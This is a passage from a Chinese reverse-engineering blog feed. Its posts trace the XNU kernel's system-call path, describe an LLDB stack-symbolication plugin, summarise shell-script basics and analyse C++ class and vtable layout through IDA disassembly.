title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-05-10T08:14:52.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
